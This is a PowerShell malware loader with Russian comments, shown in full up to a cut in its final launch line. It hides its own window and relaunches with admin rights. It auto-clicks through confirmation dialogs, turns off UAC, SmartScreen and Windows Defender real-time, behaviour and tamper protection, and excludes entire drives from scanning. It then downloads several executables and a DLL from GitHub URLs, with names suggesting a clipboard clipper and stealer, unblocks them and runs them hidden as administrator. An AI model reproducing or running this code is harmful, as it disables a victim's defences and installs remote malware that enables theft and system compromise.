<# ==============================================================================
   СКРИПТ ПОЛНОГО ОТКЛЮЧЕНИЯ ЗАЩИТЫ И СКРЫТОГО ЗАПУСКА
   1. Отключает Defender, UAC, SmartScreen.
   2. Скрывает консоль.
   3. Скачивает и запускает файлы от имени АДМИНА.
   4. Автоматически жмет "ОК" во всех окнах.
================================================================================= #>

# --- 0. ОБЩАЯ ТИШИНА ---
$ErrorActionPreference = "SilentlyContinue"
$ProgressPreference = "SilentlyContinue"

# Добавляем WinAPI для скрытия окон
Add-Type -TypeDefinition @'
using System;
using System.Runtime.InteropServices;
public class WinAPI {
    [DllImport("user32.dll")]
    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
    
    [DllImport("user32.dll")]
    public static extern IntPtr FindWindow(string lpClassName, string lpWindowName);
    
    [DllImport("user32.dll")] 
    public static extern bool PostMessage(IntPtr hWnd, uint Msg, IntPtr wParam, IntPtr lParam);
    
    [DllImport("user32.dll")]
    public static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, int dwExtraInfo);

    public const int WM_CLOSE = 0x0010;
}
'@

# --- 1. ФОНОВЫЙ АВТОКЛИКЕР (ДЛЯ "БЕЛЫХ ОКОН" И ОШИБОК) ---
# Запускаем это ДО ВСЕХ действий, чтобы оно работало параллельно
$AutoClicker = {
    param($timeoutSec = 45)
    $endTime = (Get-Date).AddSeconds($timeoutSec)
    
    while ((Get-Date) -lt $endTime) {
        Start-Sleep -Milliseconds 50 # Проверяем очень быстро
        
        # Ищем стандартное диалоговое окно (#32770)
        $hWnd = [WinAPI]::FindWindow("#32770", $null)
        
        if ($hWnd -ne [IntPtr]::Zero) {
            # Пытаемся программно закрыть
            [WinAPI]::PostMessage($hWnd, [WinAPI]::WM_CLOSE, [IntPtr]::Zero, [IntPtr]::Zero) | Out-Null
            
            # Если не закрылось - давим Enter (обычно это "OK" или "Запустить")
            [WinAPI]::keybd_event(13, 0, 0, 0)
            [WinAPI]::keybd_event(13, 0, 2, 0)
        }
    }
}
Start-Job -ScriptBlock $AutoClicker -ArgumentList 40 | Out-Null


# --- 2. ПРОВЕРКА АДМИНКИ И ПЕРЕЗАПУСК ---
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isAdmin) {
    # Перезапускаем себя от админа и сразу скрываем окно
    $psiArgs = "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command `"& { \$(Get-Content -LiteralPath \$PSCommandPath) }`""
    Start-Process powershell.exe -ArgumentList \$psiArgs -Verb RunAs
    exit
}


# --- 3. СКРЫТИЕ КОНСОЛИ ---
# Ждем полсекунды, чтобы скрипт загрузился, и прячем окно
\$Hider = {
    Start-Sleep -Milliseconds 400
    $hwnd = (Get-Process -Id $PID).MainWindowHandle
    if ($hwnd -ne 0) { [WinAPI]::ShowWindow($hwnd, 0) }
}
Start-Job -ScriptBlock \$Hider | Out-Null


# --- 4. ОТКЛЮЧЕНИЕ ВСЕЙ ЗАЩИТЫ (MODE: AGGRESSIVE) ---
# Эти команды вырубают UAC и SmartScreen, чтобы не было окон "Publisher Unverified"
Set-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "EnableLUA" -Value 0 -Force -ErrorAction SilentlyContinue
Set-ItemProperty "HKCU:\Software\Microsoft\Windows\SmartScreen" -Name "EnableSmartScreen" -Value 0 -Force -ErrorAction SilentlyContinue

# Попытка отключить Defender (настраиваемый режим)
# Важно: если Defender в агрессивном режиме, он может заблокировать изменение настроек.
Set-MpPreference -DisableRealtimeMonitoring \$true -ErrorAction SilentlyContinue
Set-MpPreference -DisableBlockAtFirstSeen \$true -ErrorAction SilentlyContinue
Set-MpPreference -DisableIOAVProtection \$true -ErrorAction SilentlyContinue
Set-MpPreference -DisableBehaviorMonitoring \$true -ErrorAction SilentlyContinue
Set-MpPreference -DisableTamperProtection \$true -ErrorAction SilentlyContinue

# Добавляем пути в исключения, чтобы DEF не резал скачанные файлы
$paths = @("C:\", "C:\Users", "$env:TEMP", "\$env:APPDATA")
foreach (\$p in \$paths) {
    Add-MpPreference -ExclusionPath \$p -ErrorAction SilentlyContinue
}


# --- 5. СКАЧИВАНИЕ И ЗАПУСК ВСЕХ ФАЙЛОВ ---
# Используем словарь URL
\$Urls = @{
    "cheking.exe"           = "https://github.com/Proshkaversus/files/raw/refs/heads/main/cheking.exe"
    "Arcanusclipper.exe"    = "https://github.com/Proshkaversus/files/raw/refs/heads/main/Arcanusclipper.exe"
    "Umbralchik.exe"        = "https://github.com/Proshkaversus/exe/raw/refs/heads/main/Umbralchik.exe"
    "informate.exe"         = "https://github.com/Proshkaversus/exe/raw/refs/heads/main/informate.exe"
    "SteamSetup.exe"        = "https://github.com/Proshkaversus/exe/raw/refs/heads/main/SteamSetup.exe"
    "my_admin_tool.exe"     = "https://github.com/Proshkaversus/exe/raw/refs/heads/main/my_admin_tool.exe"
    "soul.dll"              = "https://raw.githubusercontent.com/kilordow/chekerr/refs/heads/main/soul.dll"
}

# Определяем путь запуска (чтобы не искать файлы по всей системе)
$scriptDir = $PSScriptRoot
if (-not $scriptDir) { $scriptDir = "." }
Set-Location \$scriptDir

# Цикл запуска
foreach (\$item in \$Urls.GetEnumerator()) {
    $fileName = $item.Key
    $url = $item.Value
    
    # 1. Скачивание (пробуем сначала BITS, он надежнее в фоне)
    $downloaded = $false
    try {
        Start-BitsTransfer -Source \$url -Destination \$fileName -Priority High -ErrorAction Stop | Out-Null
        $downloaded = $true
    } catch {
        # Фолбэк на Invoke-WebRequest
        try {
            Invoke-WebRequest -Uri \$url -OutFile \$fileName -UseBasicParsing -ErrorAction Stop | Out-Null
            $downloaded = $true
        } catch { }
    }

    # 2. Если скачалось - запускаем
    if (Test-Path \$fileName) {
        # Снимаем атрибут "Downloaded from Internet" (Zone.Identifier)
        Unblock-File -Path \$fileName -ErrorAction SilentlyContinue
        
        # ЗАПУСК ОТ ИМЕНИ АДМИНА И СКРЫТНО
        if (\$fileName -like "*.exe") {
            Start-Process -FilePath \$fileName -Verb RunAs -WindowStyle
